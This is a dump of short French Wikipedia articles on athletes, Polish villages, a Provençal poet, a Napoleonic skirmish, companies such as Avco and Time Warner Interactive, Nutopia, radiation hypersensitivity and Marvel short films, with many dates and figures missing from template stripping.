, né le , à Suita, au Japon, est un joueur japonais de basket-ball. Il évolue aux postes d'ailier fort et de pivot. Il a un frère jumeau lui aussi basketteur Joji Takeuchi.

</doc>
<doc id="7901315" url="https://fr.wikipedia.org/wiki?curid=7901315" title="Myszczyn">
Myszczyn

Myszczyn [ˈmɨʂt͡ʂɨn] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 9 kilomètres à l'ouest d'Ożarów Mazowiecki (chef-lieu) et à 22 kilomètres à l'ouest de Varsovie.
Le village a une population de 136 habitants en 2009.

</doc>
<doc id="7901316" url="https://fr.wikipedia.org/wiki?curid=7901316" title="Ołtarzew">
Ołtarzew

Ołtarzew [ɔu̯ˈtaʐɛf] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 2 kilomètres à l'ouest d'Ożarów Mazowiecki (chef-lieu) et à 15 kilomètres à l'ouest de Varsovie.
Le village a une population de 524 habitants en 2009.
Personnalités liées à la commune.
Zofia Jasnota compositrice polonaise et professeur de musique à la Université de musique Frédéric-Chopin, y est née le .

</doc>
<doc id="7901317" url="https://fr.wikipedia.org/wiki?curid=7901317" title="Joji Takeuchi">
Joji Takeuchi

, né le , à Suita, au Japon, est un joueur japonais de basket-ball. Il évolue au poste d'ailier fort. Il a un frère jumeau basketteur Kousuke Takeuchi.

</doc>
<doc id="7901318" url="https://fr.wikipedia.org/wiki?curid=7901318" title="Iliyan Nedkov">
Iliyan Nedkov

Iliyan Nedkov (né le ) est un judoka bulgare. Il participe aux Jeux olympiques d'été de 1980 dans la catégorie des poids mi-légers et remporte la médaille de bronze.

</doc>
<doc id="7901320" url="https://fr.wikipedia.org/wiki?curid=7901320" title="Antoine Blaise Crousillat">
Antoine Blaise Crousillat

Antoine Blaise Crousillat, né le à Salon-de-Provence où il est mort le , est un poète français.
Poète provençal de langue d'oc, il est dit « Doyen des félibres ».
Biographie.
Antoine Blaise Crousillat naît le dans la maison de ses parents située place des Ormeaux à Salon-de-Provence. Elle deviendra la place Crousillat le . 
Son père, Jean Joseph, est négociant-revendeur et fabricant d'eau de vie et de cierges. Sa mère, Thérèse Élisabeth Monteau, mettra au monde dix enfants ; Antoine est le de la lignée.
Avant 1832, Antoine Blaise Crousillat apprend les rudiments de latin avec Jean Marcel David dit Gassier, un ami de la famille qui écrit : . 
De 1832 à 1834, il étudie la philosophie et la théologie au grand séminaire d'Aix-en-Provence, puis il passe à Marseille. Sa mère le laisse partir avec joie pour le séminaire d'Aix où il achève ses études classiques.
Tiré au sort pour la conscription, il est réformé pour une taie cornéenne dans l'œil droit.
Il rencontre Joseph Roumanille en 1845 et Frédéric Mistral le , avec lesquels il entretient une correspondance durant 47 ans.
Il participe au Congrès des poètes provençaux à Arles ( Roumavàgi) : il est un des sept prieurs (). Au Congrès des poètes d'Aix, il siège parmi les sept prieurs (). Aux jeux floraux de Sainte-Anne à Apt, il est membre du jury (). Il soutient la Sainte-Estelle de Marseille en siégeant parmi 50 majoraux (). Il est présent aux fêtes félibréennes de Montpellier (24 au ) et au Consistoire félibréen de la Sainte-Estelle à l'hôtel de ville de Martigues (). Il lit "Ei Baus" aux grands jeux floraux des Baux-de-Provence ().
Le , à Avignon, il est nommé majoral avec la "Cigale de Salon". En 1881, François Delille le liste parmi les sept fondateurs du félibrige.
Entre 1841 et 1899, il participe à la publication de la plupart des revues littéraires provençales. Il reçoit une médaille d'or pour son "Odo au Rèy René" à Aix-en-Provence (). Entre 1864 et 1894, il recevra d'autres récompenses littéraires à Béziers, Paris, Toulon…
En 1899, on lui attribue le ruban violet de chevalier de l'Académie d'Aix.
Il fut également fabricant de nougat et de cierges pour les églises et les synagogues.
Il meurt le à Salon-de-Provence.

</doc>
<doc id="7901321" url="https://fr.wikipedia.org/wiki?curid=7901321" title="Orły (Mazovie)">
Orły (Mazovie)

Orły [ˈɔrwɨ] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ à l'ouest d'Ożarów Mazowiecki (chef-lieu) et à à l'ouest de Varsovie.
Le village a une population de en 2009.

</doc>
<doc id="7901323" url="https://fr.wikipedia.org/wiki?curid=7901323" title="Orły">
Orły



</doc>
<doc id="7901329" url="https://fr.wikipedia.org/wiki?curid=7901329" title="Antoine Blaise Crousillat, est un poète provençal">
Antoine Blaise Crousillat, est un poète provençal



</doc>
<doc id="7901330" url="https://fr.wikipedia.org/wiki?curid=7901330" title="Orły-Kolonia">
Orły-Kolonia

Orły-Kolonia [ˈɔrwɨ kɔˈlɔɲa] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 8 kilomètres à l'ouest d'Ożarów Mazowiecki (chef-lieu) et à 22 kilomètres à l'ouest de Varsovie.
Le village a une population de 60 habitants en 2006.

</doc>
<doc id="7901336" url="https://fr.wikipedia.org/wiki?curid=7901336" title="Ożarów (Mazovie)">
Ożarów (Mazovie)

Ożarów [ɔˈʐaruf] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 3 kilomètres à l'est d'Ożarów Mazowiecki (chef-lieu) et à 12 kilomètres à l'ouest de Varsovie.
Le village a une population de 235 habitants en 2009.

</doc>
<doc id="7901337" url="https://fr.wikipedia.org/wiki?curid=7901337" title="Gnaphale de Norvège">
Gnaphale de Norvège



</doc>
<doc id="7901338" url="https://fr.wikipedia.org/wiki?curid=7901338" title="Combat des Coutures">
Combat des Coutures

Le combat des Coutures se déroule le près de Reims, dans le département de la Marne, et oppose la cavalerie française commandée par le général Jean-Marie Defrance aux cosaques russes. L'affrontement se solde par une victoire des Français qui dispersent leurs adversaires.
Prélude de la bataille.
Après la chute de Soissons le , l'armée prussienne commandée par le maréchal Blücher peut franchir l'Aisne et regrouper ses forces, soit environ , contre les troupes de Napoléon qui n'en alignent que . L'Empereur décide néanmoins de continuer son offensive : apprenant que la ville de Reims menace d'être occupée par le corps russe de Saint-Priest, il envoie son aide de camp Corbineau protéger la ville et ordonne le franchissement de l'Aisne, qui est effectué le . Le , le maréchal Mortier détache à son tour le général Defrance avec environ 800 soldats issus des , et de gardes d'honneur de la Garde impériale ainsi que du de hussards. Alors que les cavaliers arrivent à proximité de Reims, ils se voient barrer la route par environ russes.
Déroulement.
Rapidement attaquée par les gardes d'honneur et les hussards, la cavalerie russe se replie, poursuivie dans sa retraite par le général Defrance.
Conséquences.
Après avoir bousculé les Russes, Defrance rentre dans Reims où il renforce la garnison du général Corbineau. Les deux commandants doivent toutefois évacuer la place le face à l'avancée de Saint-Priest qui s'empare de la ville le lendemain, avant d'en être délogé à son tour par Napoléon le après une dure bataille.

</doc>
<doc id="7901344" url="https://fr.wikipedia.org/wiki?curid=7901344" title="Avco">
Avco

Aviation Corporation (Avco) est une holding spécialisée dans le secteur de l'aéronautique, filiale de Textron.
Histoire.
Aviation Corporation est fondée le dans l'état du Delaware aux États-Unis. La holding acquiert plusieurs compagnies aériennes et détient des intérêts dans de nombreuses sociétés de l'aéronautique.
Plusieurs filiales de Avco fusionnent en 1930 pour donner "American Airways", qui devient American Airlines en 1934. Avco acquiert les actifs aéronautiques, dont Lycoming Engines, de la Cord Corporation de Errett Cord en 1939.
La société se diversifie après la Seconde Guerre mondiale en investissant dans le domaine des machines agricoles et devient Avco Manufacturing Corporation en 1947. Avco change à nouveau de nom pour Avco Corporation en 1959.
La société exploite le site de l'usine de moteurs pour l'armée de Stratford (Connecticut) entre 1951 et 1994.
Avco investit également dans les médias avec (diffusion), Embassy Pictures (cinéma), Avco Records (musique) ou encore Cartrivision (cassette vidéo).
Avco est acquis par Textron en 1985 pour un montant de 2,9 milliards de dollars. Lycoming Engines intègre ainsi le groupe Textron. Avco devient "Textron Defense Systems" puis "Textron Systems".

</doc>
<doc id="7901349" url="https://fr.wikipedia.org/wiki?curid=7901349" title="Morton B. Panish">
Morton B. Panish

Morton B. Panish (né le ) est un chercheur en chimie physique américain. Il est connu pour avoir développé en 1970, avec Izuo Hayashi, un laser semiconducteur à onde entretenue fonctionnant à la .
Jeunesse.
Morton Panish naît à Brooklyn le d'Isidore Panish et Fanny Glasser. Six ans plus tard, son frère Paul naît.
Morton Panish fréquente la "", d'où il obtient un diplôme en 1947. Il va par la suite au "Brooklyn College" pendant 2 ans, puis fréquente l'université de Denver.
Panish étudie d'abord la chimie organique. Il rencontre en classe Evelyn Chaim, sa future femme.
Par la suite, il s'intéresse de plus en plus à la chimie physique. Il obtient son diplôme en 1950.
Panish fait des études supérieures à l'université d'État du Michigan, où il sort avec une majeur en chimie physique et une mineure en chimie organique. Sa thèse porte sur une , chose qu'il ne trouve pas très intéressante.
De 1954 à 1957, Panish travaille au Laboratoire national d'Oak Ridge, Tennessee, où il étudie la thermodynamique chimique des sels fondus. Par la suite, il déménage au Massachusetts, où il travaille à la division recherche et développement de Avco. Il y travaille de 1957 à 1964, puis quitte à la suite de restrictions budgétaires.
Laboratoires Bell.
Panish est engagé aux laboratoires Bell et commence à y travailler en . Il est assigné au "".
En 1966, il fait équipe avec Izuo Hayashi pour étudier les diodes laser.

</doc>
<doc id="7901351" url="https://fr.wikipedia.org/wiki?curid=7901351" title="Lasciatemi morire">
Lasciatemi morire



</doc>
<doc id="7901356" url="https://fr.wikipedia.org/wiki?curid=7901356" title="Aramby Emizh">
Aramby Emizh

Aramby Emizh (né le ) est un judoka soviétique. Il participe aux Jeux olympiques d'été de 1980 en combattant dans la catégorie des poids super-légers et remporte la médaille de bronze.

</doc>
<doc id="7901357" url="https://fr.wikipedia.org/wiki?curid=7901357" title="Giuseppe Michielli">
Giuseppe Michielli

Giuseppe Michielli (né le à Gemona del Friuli) est un coureur du combiné nordique italien.
En équipe nationale de 2000 à 2014, il a participé à trois éditions des Jeux olympiques d'hiver, en 2006, 2010 et 2014.
Palmarès.
Jeux olympiques.
Légende : : pas d'épreuveGT : grand tremplin / PT : petit tremplin.
Championnats du monde.
Légende : : pas d'épreuve.GT : grand tremplin / PT : petit tremplin.
Autres.
Il détient trois titres de champion d'Italie, deux en 2007 et un en 2006.
Il compte aussi une victoire en Coupe du monde B à Eisenerz en 2008.

</doc>
<doc id="7901358" url="https://fr.wikipedia.org/wiki?curid=7901358" title="Time Warner Interactive">
Time Warner Interactive

Time Warner Interactive Inc. est une entreprise américaine fondée en 1994 qui développe et commercialise des jeux vidéo pour le salon. L'entreprise et la marque sont nées à la suite du rachat de Tengen par Time Warner. La marque "Time Warner Interactive" disparait en 1996 lors du rachat de l'entreprise par WMS Industries qui l'intègre dans "Midway Games", puis l'entreprise est dissoute en 1999.
Historique.
En , Time Warner (en 1989, Warner Communications fusionne avec Time Inc. formant "Time Warner") achète une participation majoritaire dans "Atari Games" (78 %) et en fait une filiale de son groupe. Tengen est renommé "Time Warner Interactive Inc." le (annonce faite le ). La marque "Tengen" est abandonnée et les jeux sont produits sous la nouvelle marque "Time Warner Interactive". Plusieurs jeux sortent sur console comme "Dick Vitale's "Awesome, Baby!" College Hoops" ou "Sylvester and Tweety in Cagey Capers". "Time Warner Interactive" annonce en fin d'année un accord de licence avec Wayne Gretzky pour développer des jeux sur différentes plates-formes.
Tout comme "Tengen", "Time Warner Interactive" officie dans le domaine du jeu vidéo de salon.
"Time Warner Interactive" renomme la filiale japonaise "Tengen Ltd" en "K.K. Time Warner Interactive" en 1994 et publie des jeux pour PlayStation et Saturn. Dès le début de l'année 1994, "Nintendo" et "Atari Games" déclare dans un communiqué commun, avoir trouvé un terrain d'entente et arrêtent les différentes poursuites mutuelles, signalant qu'ils pourront retravailler ensemble. "Time Warner Interactive" passe un accord de licence avec Atari Corp. pour publier des jeux sur Jaguar le .
Le , "Warner Communications" signe un préaccord de vente concernant "Atari Games" avec "Williams Interactive Inc." (filiale créée de par WMS Industries pour acquérir "Atari Games"). Le WMS Industries annonce publiquement le rachat de "Atari Games", comprenant également ses filiales "Atari Games Ireland Limited", "Time Warner Interactive Inc." (Californie) (autrefois appelé Tengen), et "K.K. Time Warner Interactive" (Japon). Le louis Nicastro, président de WMS Industries transfère 100 % des propriétés de "Atari Games" à sa filiale "Midway Interactive Inc." (précédemment "Williams Interactive Inc."), filiale de "Midway Games". Midway réactive la marque "Atari Games et abandonne la marque "Time Warner Interactive". "Williams Interactive Inc" est renommé à nouveau "Tengen Inc." le .
"Midway Games" dissout "K.K. Time Warner Interactive" en 1999, la filiale fondée sous l’appellation Tengen Ltd. en 1990. La filiale "Time Warner Interactive Inc." est dissoute le .

</doc>
<doc id="7901359" url="https://fr.wikipedia.org/wiki?curid=7901359" title="Time Warner Interactive Inc">
Time Warner Interactive Inc



</doc>
<doc id="7901360" url="https://fr.wikipedia.org/wiki?curid=7901360" title="Time Warner Interactive Inc.">
Time Warner Interactive Inc.



</doc>
<doc id="7901361" url="https://fr.wikipedia.org/wiki?curid=7901361" title="Heidegger-Introduction à la métaphysique">
Heidegger-Introduction à la métaphysique



</doc>
<doc id="7901363" url="https://fr.wikipedia.org/wiki?curid=7901363" title="Time Warner Interactive Incorporated">
Time Warner Interactive Incorporated



</doc>
<doc id="7901364" url="https://fr.wikipedia.org/wiki?curid=7901364" title="Dimanche de Thomas">
Dimanche de Thomas

Le dimanche de Thomas est, dans les Églises d'Orient – Églises orthodoxes et Églises catholiques de rite byzantin – le dimanche après Pâques (P + 7), appelé aussi "Antipascha" (autre face de Pâques comme fin de la Semaine radieuse). Dans l'Église primitive, c'est lors de ce dimanche que les catéchumènes quittaient leurs aubes et revenaient dans le siècle. À partir de ce jour de l'Antipasqua, l'Église consacre chaque dimanche à la célébration de la Résurrection. Dimanche est nommé "Résurrection" en russe et "Jour du Seigneur" en grec.
Thème.
Ce jour célèbre la vision qu'a Thomas, l'apôtre incrédule, de Jésus ressuscité, huit jours après la Résurrection.
Texte de l'Évangile.
Voici le texte de l'Évangile ("Jean", ).
Contenu de la célébration.
Comme pour tous les services jusqu'à l'Ascension, on chante le tropaire pascal. Les épîtres sont tirées des Actes des apôtres ; elles remémorent la vie des premiers Chrétiens en communion avec le Christ. Les lectures sont extraites de Jean, considéré comme particulièrement approprié aux nouveaux baptisés.
Hymnographie.
&lt;poem&gt;
&lt;/poem&gt;
&lt;poem&gt;
&lt;/poem&gt;
&lt;poem&gt;
&lt;/poem&gt;

</doc>
<doc id="7901372" url="https://fr.wikipedia.org/wiki?curid=7901372" title="Karstologue">
Karstologue



</doc>
<doc id="7901382" url="https://fr.wikipedia.org/wiki?curid=7901382" title="San Feliu de Guíxols">
San Feliu de Guíxols



</doc>
<doc id="7901392" url="https://fr.wikipedia.org/wiki?curid=7901392" title="Nutopia">
Nutopia

Nutopia est un pays conceptuel, souvent considéré comme une micronation, fondé par John Lennon et Yoko Ono. Il s'agissait en partie de répondre d'une façon satirique aux problèmes de visas du chanteur. Il n'y a pas d'État souverain et aucune naturalisation enregistrée.
Le nom est une contraction de « "New" », nouveau, et « "Utopia" ».
Histoire.
Le , John Lennon et Yoko Ono annoncent la création de Nutopia lors d'une conférence de presse à New York.
Ils s'en disent les ambassadeurs et cherchent l'immunité diplomatique pour mettre fin aux problèmes d'immigration de Lennon, alors que le couple essaie de s'installer aux États-Unis. John Lennon évoque ce pays imaginaire, issu des idéaux de sa chanson "Imagine", en faisant une déclaration « officielle ».
Sur son disque "Mind Games", publié en 1973, une piste de trois secondes de silence, à la fin de la face 1, est intitulée "Nutopian International Anthem". La « déclaration nationale » de ce « pays » est imprimée sur la pochette du disque : 
En 2006, un site web pour Nutopia est créé à l'occasion du film documentaire "Les U.S.A. contre John Lennon".
Symboles.
Le drapeau de Nutopia est uniquement blanc. En réponse aux critiques, John Lennon et Yoko Ono expliquent que seules la capitulation et le compromis peuvent amener à la paix. Plus tard, U2 arbore le drapeau de Nutopia au moment des chansons politiques lors de concerts pour son troisième album, "War" ; on le retrouve ainsi dans le film du concert "Under a Blood Red Sky".
Le sceau de Nutopia est un pinnipède (jeu de mots avec l'homonymie du mot anglais « "seal" » désignant soit un sceau, soit un phoque – pouvant du reste renvoyer au morse de la chanson "I Am the Walrus").
Une plaque portant la mention de est posée sur le domicile du couple dans le Dakota Building à New York.

</doc>
<doc id="7901404" url="https://fr.wikipedia.org/wiki?curid=7901404" title="George Springer">
George Springer

George Springer (né le à New Britain, Connecticut, États-Unis) est un voltigeur des Blue Jays de Toronto de la Ligue majeure de baseball.
Il est élu joueur par excellence de la Série mondiale 2017 remportée par Houston.
Carrière.
Débuts.
George Springer joue au baseball dans une école secondaire d'Avon dans le Connecticut et est repêché au de sélection par les Twins du Minnesota de la Ligue majeure de baseball en juin 2008. Il repousse l'offre et décide plutôt de s'engager à l'Université du Connecticut, où il évolue pour l'équipe des Huskies. En juin 2011, les Astros de Houston en font leur choix de première ronde. Springer est le sélectionné au total cette année-là au repêchage amateur du baseball majeur.
Springer est rapidement considéré comme l'une des pièces maîtresses de la remontée anticipée de la franchise des Astros, qui croupit dans les bas-fonds de la ligue depuis plusieurs saisons. L'un des jeunes joueurs les plus prometteurs du baseball, il apparaît en 2012 au du classement des 100 meilleurs espoirs dressé annuellement par "Baseball America", passant ensuite en en 2013 puis au le début de la saison 2014.
En 2013, Springer gradue chez les RedHawks d'Oklahoma City, le club-école Triple-A des Astros dans la Ligue de la côte du Pacifique. En 135 matchs joués cette année-là, partagée entre le club de Corpus Christi au niveau Double-A et Oklahoma City, Springer frappe pour ,303 de moyenne au bâton avec 37 circuits, 108 points produits, un pourcentage de présence sur les buts de ,411 et une moyenne de puissance de ,600.
En , les Astros offrent à Springer un contrat, qu'il rejette, de 23 millions de dollars pour 7 saisons, du jamais vu pour un athlète comptant si peu d'expérience.
Astros de Houston.
Le , George Springer est pour la première fois rappelé des ligues mineures par les Astros de Houston. Il fait ses débuts le jour même contre les Royals de Kansas City et réussit son premier coup sûr dans les majeures aux dépens du lanceur Jeremy Guthrie puis marque son premier point sur le circuit de son coéquipier Jason Castro. Springer frappe son premier circuit dans les majeures le face à Drew Smyly des Tigers de Détroit. Il est nommé meilleure recrue de mai 2014 dans la Ligue américaine après avoir frappé 30 coups sûrs dont 15 pour plus d'un but, 10 circuits, 22 points marqués et 25 points produits. Il présente une moyenne de puissance de ,647 durant cette bonne séquence. Il est le premier joueur de première année des Astros à être élu recrue du mois dans la Ligue américaine, et le premier de la franchise à recevoir cet honneur depuis Hunter Pence en mai 2007, alors que le club se trouvait en Ligue nationale. En 7 matchs disputés du 21 au , Springer frappe un circuit dans 6 rencontres, dont un match de deux longues balles. D'après Elias, il est la deuxième recrue à réussir 7 circuits sur 7 matchs après Rudy York des Tigers de Détroit de 1937.
Springer joue 78 matchs à sa première saison chez les Astros, campagne qui se termine le lorsqu'il est blessé aux quadriceps lors d'un match contre les White Sox de Chicago. Malgré une basse moyenne au bâton de ,231 il produit 51 points et frappe 20 circuits, seulement un de moins que le record de franchise pour une recrue, établi en 2000 par Lance Berkman.
Springer est invité au match des étoiles 2017.
Il est élu joueur par excellence de la Série mondiale 2017 remportée par Houston.

</doc>
<doc id="7901417" url="https://fr.wikipedia.org/wiki?curid=7901417" title="Hypersensibilité au rayonnement">
Hypersensibilité au rayonnement

La notion de radiosensibilité individuelle au rayonnement ou d'hypersensibilité au rayonnement est une hypersensibilité aux rayonnements ionisants.
Selon l'ASN, « La radiosensibilité individuelle (variabilité de l’effet d’une même dose en fonction de l’individu qui la reçoit) est encore un domaine de recherche » .
Cette radiosensibilité individuelle pourrait varier d'un facteur 1 à 10 selon les individus (5 à 15 % de la population seraient plus radiosensible) et pose une question de santé publique. Elle pourrait au moins en grande partie être induite par une efficacité différente selon la génétique et l'histoire des individus de leurs mécanismes de réparation
des lésions radioinduites de l’ADN (mécanismes complexes et nombreux, qui font intervenir de nombreux gènes). On cherche maintenant à identifier des sous-populations (ou sous-groupes de patients) hypersensibles (par des marqueurs génétiques) afin d'avoir éventuellement la capacité de par des tests ad hoc.
Histoire du concept.
On sait depuis longtemps que les individus, en partie pour des raisons génétiques sont plus ou moins vulnérables aux coups de soleil induits par le rayonnement UV solaire ou aux effets cancérigènes de ce rayonnement (localement exacerbé par le trou de la couche d'ozone); 
Une radiosensibilité individuelle aux fortes doses de rayonnements ionisants est 
La médecine, et en particulier la médecine nucléaire s'intéresse aussi à la radiosensibilité cellulaire, qui peut d'ailleurs être utilisée pour traiter par radiothérapie certains cancers. Le fait que les expériences de laboratoire utilisent des souris, rats ou cobayes de mêmes souches et génétiquement très proches ont pu cacher une partie des radiosensibilités individuelles (génétique notamment) chez ces animaux.
Depuis les années 1990 au moins, quelques indices plaidaient pour l'existence d'un syndrome d'hypersensibilité, ou de sensibilité aux faibles doses d'irradiation chez certains patients ou individus.
Des chercheurs essayent depuis plus de 30 ans de mettre au point et améliorer des tests de radiosensibilité (cellulaire, tumorale, individuels...). Ces tests étaient encore très imparfaits dans les années 1990 , mais ils ont ensuite bénéficié des progrès de la radiobiologie et de . 
Grâce à l'immunofluorescence, on a montré par l'exposition de cellules d’épithélium mammaire humain en culture à des faibles doses que selon Bourguignon et al.. 
Au début des années 2000, la question de l’impact du facteur individuel dans la réponse aux faibles doses de radiations est encore discutée, mais de nouveaux moyens de mieux comprendre les réponses moléculaires, cellulaires et tissulaires apparaissent. Ils permettent aussi de poser des hypothèses explicatives aux effets létaux et carcinogènes différenciés, plus précoces ou plus aigus chez certains patients exposés à des radiations ionisantes.
Fin 2013, l'ASN a organisé un séminaire intitulé « "Radiosensibilité individuelle : une notion ancienne et son avenir" » pour .
En 2013, pour l'ASN, des travaux de recherches sont encore nécessaires pour détecter d'éventuels biais et confirmer les premiers résultats, mais l'Agence invite dans son rapport annuel 2013 à envisager de nouvelles questions socio-éthiques (voir plus bas)
Enjeux.
Une meilleure compréhension des phénomènes de radiosensibilité individuelle a au moins les enjeux suivants :
Questions sociétales et éthiques.
L'arrivée sur le marché de tests de détection d'une hyper-radiosensibilité individuelle (ou des tests prédictifs de radiosensibilité des tissus sains) pourrait se faire à courte échéance. Ils pourraient alors changer les pratiques des radiothérapeutes), mais aussi poser de nouvelles questions d'éthique biomédicale, voire d'éthique environnementale :
Faudra-t-il alors recommander un dépistage avant toute radiothérapie ou succession d'examens de scanographie ?
Recommandations.
En 2013, l'ASN recommande de ne pas exposer inutilement les personnes aux rayonnements ionisants, 

</doc>
<doc id="7901422" url="https://fr.wikipedia.org/wiki?curid=7901422" title="Gus Schlosser">
Gus Schlosser

August Schlosser (né le à Norfolk, Virginie, États-Unis) est un lanceur de relève gaucher des Rockies du Colorado de la Ligue majeure de baseball.
Carrière.
Braves d'Atlanta.
Gus Schlosser est drafté en ronde par les Braves d'Atlanta en 2011. Lanceur partant dans les ligues mineures, Schlosser fait ses débuts dans le baseball majeur comme lanceur de relève pour Atlanta le . Il effectue 15 sorties en relève pour Atlanta et lance 17 manches et deux tiers, mais accorde 15 points mérités pour une Moyenne de points mérités de 7,64.
Rockies du Colorado.
Le , Atlanta échange les lanceurs droitiers Schlosser et David Hale aux Rockies du Colorado contre deux receveurs des ligues mineures, Jose Briceno et Chris O'Dowd.

</doc>
<doc id="7901423" url="https://fr.wikipedia.org/wiki?curid=7901423" title="Mariya Panfilova">
Mariya Panfilova

Mariya Panfilova (), née Sadilova le à Perm, est une biathlète russe naturalisée ukrainienne puis biélorusse (puis à nouveau ukrainienne).
Carrière.
Née à Perm en RSFS de Russie, Maria Sadilova débute dans le ski de fond puis opte à partir de 2007 pour le biathlon. Elle présente la particularité d'avoir changé plusieurs fois de nationalité et porté les couleurs de trois pays différents en Coupe du monde : la Russie, l'Ukraine et la Biélorussie. Barrée en début de carrière par la concurrence et les querelles internes de sélection en équipe de Russie (une seule course disputée en Coupe du monde en ), elle décide de changer de nationalité en optant pour l'Ukraine, changement qui coïncide avec son nouveau nom après mariage (Panfilova). De 2013 à 2014 (deux saisons), Maria Panfilova participe alors régulièrement à la Coupe du monde, obtenant notamment son premier et unique podium de Coupe du monde avec le relais ukrainien à Sotchi en 2013, où elle est aussi treizième de l'individuel, son meilleur résultat individuel. 
Après avoir couru pour l'équipe d'Ukraine lors du relais mixte aux Jeux olympiques de 2014, elle décide à l'inter-saison de changer à nouveau de nationalité et choisit cette fois la Biélorussie. De 2015 à 2017, elle peine à trouver sa place dans la sélection biélorusse pour la Coupe du monde (seulement trois courses disputées dont un relais) et passe l'essentiel de son temps à l'échelon inférieur en IBU cup. Après deux saisons décevantes en Biélorussie elle décide de revenir en Ukraine et est sélectionnée pour les championnats du monde de biathlon d'été 2017 disputés à Tchaïkovski. Elle y obtient avec le relais mixte ukrainien une médaille de bronze. Cependant lors de la saison hivernale 2017-2018 les portes de la coupe du monde lui restent fermées. lle doit à nouveau se contenter de participations en IBU cup et aux Championnats d'Europe, et met finalement un terme à sa carrière au printemps.

</doc>
<doc id="7901424" url="https://fr.wikipedia.org/wiki?curid=7901424" title="Laurent Depoitre">
Laurent Depoitre

Laurent Depoitre, né le à Tournai en Belgique, est un footballeur international belge qui joue au poste d'attaquant.
Biographie.
En club.
Laurent Depoitre commence sa carrière à La Montkainoise et rejoint ensuite le Royal Mouscron-Peruwelz. Il rejoint en 2009 l'Eendracht Alost, club de troisième division. Avec cette équipe, il monte en deuxième division en 2011.
Il est transféré en 2012 au KV Ostende. Il inscrit 14 buts en deuxième division avec cette équipe lors de la saison 2012-2013. Son club remporte dans le même temps le titre de champion, ce qui lui permet de découvrir la .
En 2014, il est transféré à La Gantoise, il marque 13 buts au cours du championnat 2014-2015. Il devient champion de Belgique lors de cette même saison. Il réalise de bonnes performances en Ligue des champions, où les Gantois sont sortis en 1/8e de finale contre Wolfsbourg. 
Le , il est appelé par Marc Wilmots au sein de la sélection nationale pour affronter Andorre et Israël dans le cadre des qualifications pour l'Euro 2016. Il joue le match entier contre Andorre et marque son premier but en sélection.
Le , il signe un contrat de 4 ans au FC Porto. Le , Laurent inscrit son premier but pour le compte du FC Porto lors du de finale de coupe du Portugal, contre Gafanha (victoire 3-0). 
Malgré tout, son temps de jeu est très faible chez les "Dragons", il a du mal à s'adapter au championnat portugais et n'a plus la confiance de son entraîneur. C'est pourquoi il rejoint le club anglais d'Huddersfield Town, tout juste promu en première division, le .
Il joue son premier match en League Cup face à Rotherham le . Le , Laurent Depoitre marque son premier but pour Huddersfield face à Leicester (1-1). Il inscrit son deuxième but face à Manchester United, pour offrir la victoire à son équipe (victoire 2-1). Il monte au jeu face à Chelsea le et marque un but dans les arrêts de jeu face à son compatriote Thibaut Courtois (défaite 1-3). Il signe également le but du maintien d'Huddersfield, devançant la sortie du gardien pour offrir un point à ses couleurs à Stamford Bridge lors du match retour contre Chelsea. 
La deuxième saison parmi l'élite est beaucoup plus compliquée pour Huddersfield, rapidement lanterne rouge de Premier League. Depoitre signe une passe décisive lors du déplacement à Leicester mais peine à trouver le chemin des filets.
Retourné à La Gantoise dans son club de cœur en 2019 pour une durée de 3 ans, il est victime de quelques pépins physiques en 2021 qu’il soigne chez différents professionnels. Il est sans club depuis juin 2024.
Le , n’ayant rien trouvé à l’étranger ou en Belgique qui lui donnait de l’envie de continuer, Laurent Depoitre met un terme à sa carrière de footballeur.
En sélections nationales.
Sélectionné pour la première fois par Marc Wilmots en , Laurent Depoitre joue l'intégralité du déplacement à Andorre, comptant pour les éliminatoires de l'Euro 2016. Il signe le 4e but belge lors de cette rencontre (victoire 1-4), reprenant un centre de Dries Mertens. Il figure dans l'effectif lors de la réception d'Israël quelques jours plus tard, ainsi que lors de l'amical contre l'Italie en . 
Il disparaît ensuite de la sélection pendant deux ans, avant d'être rappelé par Roberto Martinez en pour des amicaux contre le Mexique et le Japon, sans toutefois monter au jeu.

</doc>
<doc id="7901443" url="https://fr.wikipedia.org/wiki?curid=7901443" title="Marvel One-Shots">
Marvel One-Shots

Les Marvel One-Shots désignent les courts métrages édités en direct-to-video produits par Marvel Studios, prenant place dans l'univers cinématographique Marvel. Ils sont disponibles dans les éditions Blu-ray des films liés à la licence "Avengers et sur la plateforme de SVOD Disney+".
Les intrigues se déroulent en marge des longs-métrages, généralement peu de temps après l'intrigue des films, et mettent en scène des événements impliquant les personnages secondaires.
Identité visuelle (logo).
A partir de 2011, avec le premier courts-métrages, Marvel Studios officialise le logo Marvel One-Shot. En 2021, une nouvelle version de ce logo apparait pour remplacer l'ancien présent depuis 2011.
Courts-métrages.
"Le Consultant".
Après les événements de "Iron Man 2" et "L'Incroyable Hulk", Phil Coulson informe Jasper Sitwell que le Conseil de sécurité veut intégrer Emil Blonsky dans le projet Avengers. Le Conseil le considère en effet comme un héros de guerre et ne voit une menace qu'en Hulk, qu'il tient pour responsable des dégâts à New York. Le Conseil veut donc que Blonsky soit transféré par le général Thaddeus Ross et confié au SHIELD. Comme Nick Fury refuse de relâcher Blonsky, les deux agents décident d'envoyer une chèvre pour saboter les négociations, et Sitwell insiste pour choisir le consultant : Tony Stark. Comme vu dans la scène post-générique de "L'Incroyable Hulk", Ross et Tony Stark se retrouvent dans un bar et le milliardaire s'y prend si bien qu'il se fait chasser du bar par le militaire. Par vengeance, Stark rachète le bar et le fait démolir. Coulson est satisfait et apprend donc le lendemain à Sitwell que le plan a fonctionné et que Blonsky restera en prison.
"Une drôle d'histoire sur la route du marteau de Thor".
